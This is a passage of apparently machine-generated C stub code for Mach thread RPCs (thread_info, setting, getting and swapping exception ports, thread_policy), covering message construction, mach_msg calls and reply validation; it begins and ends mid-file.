	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_info_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_info */
mig_external kern_return_t thread_info
(
	thread_inspect_t target_act,
	thread_flavor_t flavor,
	thread_info_t thread_info_out,
	mach_msg_type_number_t *thread_info_outCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_flavor_t flavor;
		mach_msg_type_number_t thread_info_outCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t thread_info_outCnt;
		integer_t thread_info_out[32];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t thread_info_outCnt;
		integer_t thread_info_out[32];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_info_t__defined */

	__DeclareSendRpc(3612, "thread_info")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*thread_info_outCnt < 32)
		InP->thread_info_outCnt = *thread_info_outCnt;
	else
		InP->thread_info_outCnt = 32;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3612;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3612, "thread_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3612, "thread_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_info_t__defined)
	check_result = __MIG_check__Reply__thread_info_t((__Reply__thread_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_info_t__defined) */

	if (Out0P->thread_info_outCnt > *thread_info_outCnt) {
		(void)memcpy((char *) thread_info_out, (const char *) Out0P->thread_info_out, 4 *  *thread_info_outCnt);
		*thread_info_outCnt = Out0P->thread_info_outCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) thread_info_out, (const char *) Out0P->thread_info_out, 4 * Out0P->thread_info_outCnt);

	*thread_info_outCnt = Out0P->thread_info_outCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_set_exception_ports_t__defined)
#define __MIG_check__Reply__thread_set_exception_ports_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_set_exception_ports_t(__Reply__thread_set_exception_ports_t *Out0P)
{

	typedef __Reply__thread_set_exception_ports_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3713) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_set_exception_ports_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_set_exception_ports */
mig_external kern_return_t thread_set_exception_ports
(
	thread_act_t thread,
	exception_mask_t exception_mask,
	mach_port_t new_port,
	exception_behavior_t behavior,
	thread_state_flavor_t new_flavor
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		exception_mask_t exception_mask;
		exception_behavior_t behavior;
		thread_state_flavor_t new_flavor;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_set_exception_ports_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_set_exception_ports_t__defined */

	__DeclareSendRpc(3613, "thread_set_exception_ports")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t new_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->new_port = new_portTemplate;
	InP->new_port.name = new_port;
#else	/* UseStaticTemplates */
	InP->new_port.name = new_port;
	InP->new_port.disposition = 19;
	InP->new_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->exception_mask = exception_mask;

	InP->behavior = behavior;

	InP->new_flavor = new_flavor;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3613;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3613, "thread_set_exception_ports")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3613, "thread_set_exception_ports")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_set_exception_ports_t__defined)
	check_result = __MIG_check__Reply__thread_set_exception_ports_t((__Reply__thread_set_exception_ports_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_set_exception_ports_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_get_exception_ports_t__defined)
#define __MIG_check__Reply__thread_get_exception_ports_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_get_exception_ports_t(__Reply__thread_get_exception_ports_t *Out0P, __Reply__thread_get_exception_ports_t **Out1PP, __Reply__thread_get_exception_ports_t **Out2PP)
{

	typedef __Reply__thread_get_exception_ports_t __Reply __attribute__((unused));
	__Reply *Out1P;
	__Reply *Out2P;
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 3714) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 32 ||
	    msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) || msgh_size > (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	{
	    mach_msg_port_descriptor_t	*ptr;
	    int	i;

	    ptr = &Out0P->old_handlers[0];
	    for (i = 0; i < 32; ptr++, i++) {
		if (ptr->type != MACH_MSG_PORT_DESCRIPTOR) {
			return MIG_TYPE_ERROR;
		}
	    }
	}
#endif	/* __MigTypeCheck */

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 128);

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out2PP = Out2P = (__Reply *) ((pointer_t) Out1P + msgh_size_delta - 128);

#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_get_exception_ports_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_get_exception_ports */
mig_external kern_return_t thread_get_exception_ports
(
	thread_act_t thread,
	exception_mask_t exception_mask,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_array_t old_handlers,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		exception_mask_t exception_mask;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;
	Reply *Out2P = NULL;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_get_exception_ports_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_get_exception_ports_t__defined */

	__DeclareSendRpc(3614, "thread_get_exception_ports")

	InP->NDR = NDR_record;

	InP->exception_mask = exception_mask;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3614;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3614, "thread_get_exception_ports")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3614, "thread_get_exception_ports")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_get_exception_ports_t__defined)
	check_result = __MIG_check__Reply__thread_get_exception_ports_t((__Reply__thread_get_exception_ports_t *)Out0P, (__Reply__thread_get_exception_ports_t **)&Out1P, (__Reply__thread_get_exception_ports_t **)&Out2P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_get_exception_ports_t__defined) */

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 * Out0P->masksCnt);

	*masksCnt = Out0P->masksCnt;

	{
	    mach_msg_port_descriptor_t	*ptr;
	    int	i, j;

	    ptr = &Out0P->old_handlers[0];
	    j = min(Out0P->masksCnt, *masksCnt);
	    for (i = 0; i < j; ptr++, i++) 
		old_handlers[i] = ptr->name;
	    if (Out0P->masksCnt > 32)
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_behaviors, (const char *) Out1P->old_behaviors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_behaviors, (const char *) Out1P->old_behaviors, 4 * Out0P->masksCnt);

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_flavors, (const char *) Out2P->old_flavors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_flavors, (const char *) Out2P->old_flavors, 4 * Out0P->masksCnt);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_swap_exception_ports_t__defined)
#define __MIG_check__Reply__thread_swap_exception_ports_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_swap_exception_ports_t(__Reply__thread_swap_exception_ports_t *Out0P, __Reply__thread_swap_exception_ports_t **Out1PP, __Reply__thread_swap_exception_ports_t **Out2PP)
{

	typedef __Reply__thread_swap_exception_ports_t __Reply __attribute__((unused));
	__Reply *Out1P;
	__Reply *Out2P;
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 3715) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 32 ||
	    msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) || msgh_size > (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	{
	    mach_msg_port_descriptor_t	*ptr;
	    int	i;

	    ptr = &Out0P->old_handlers[0];
	    for (i = 0; i < 32; ptr++, i++) {
		if (ptr->type != MACH_MSG_PORT_DESCRIPTOR) {
			return MIG_TYPE_ERROR;
		}
	    }
	}
#endif	/* __MigTypeCheck */

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 128);

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out2PP = Out2P = (__Reply *) ((pointer_t) Out1P + msgh_size_delta - 128);

#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_swap_exception_ports_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_swap_exception_ports */
mig_external kern_return_t thread_swap_exception_ports
(
	thread_act_t thread,
	exception_mask_t exception_mask,
	mach_port_t new_port,
	exception_behavior_t behavior,
	thread_state_flavor_t new_flavor,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_array_t old_handlers,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		exception_mask_t exception_mask;
		exception_behavior_t behavior;
		thread_state_flavor_t new_flavor;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;
	Reply *Out2P = NULL;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_swap_exception_ports_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_swap_exception_ports_t__defined */

	__DeclareSendRpc(3615, "thread_swap_exception_ports")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t new_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->new_port = new_portTemplate;
	InP->new_port.name = new_port;
#else	/* UseStaticTemplates */
	InP->new_port.name = new_port;
	InP->new_port.disposition = 19;
	InP->new_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->exception_mask = exception_mask;

	InP->behavior = behavior;

	InP->new_flavor = new_flavor;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3615;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3615, "thread_swap_exception_ports")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3615, "thread_swap_exception_ports")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_swap_exception_ports_t__defined)
	check_result = __MIG_check__Reply__thread_swap_exception_ports_t((__Reply__thread_swap_exception_ports_t *)Out0P, (__Reply__thread_swap_exception_ports_t **)&Out1P, (__Reply__thread_swap_exception_ports_t **)&Out2P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_swap_exception_ports_t__defined) */

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 * Out0P->masksCnt);

	*masksCnt = Out0P->masksCnt;

	{
	    mach_msg_port_descriptor_t	*ptr;
	    int	i, j;

	    ptr = &Out0P->old_handlers[0];
	    j = min(Out0P->masksCnt, *masksCnt);
	    for (i = 0; i < j; ptr++, i++) 
		old_handlers[i] = ptr->name;
	    if (Out0P->masksCnt > 32)
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_behaviors, (const char *) Out1P->old_behaviors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_behaviors, (const char *) Out1P->old_behaviors, 4 * Out0P->masksCnt);

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_flavors, (const char *) Out2P->old_flavors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_flavors, (const char *) Out2P->old_flavors, 4 * Out0P->masksCnt);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_policy_t__defined)
#define __MIG_check__Reply__thread_policy_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_policy_t(__Reply__thread_policy_t *Out0P)
{

	typedef __Reply__thread_policy_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3716) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_policy_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_policy */
mig_external kern_return_t thread_policy
(
	thread_act_t thr_act,
	policy_t policy,
	policy_base_t base,
	mach_msg_type_number_t baseCnt,
	boolean_t set_limit
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
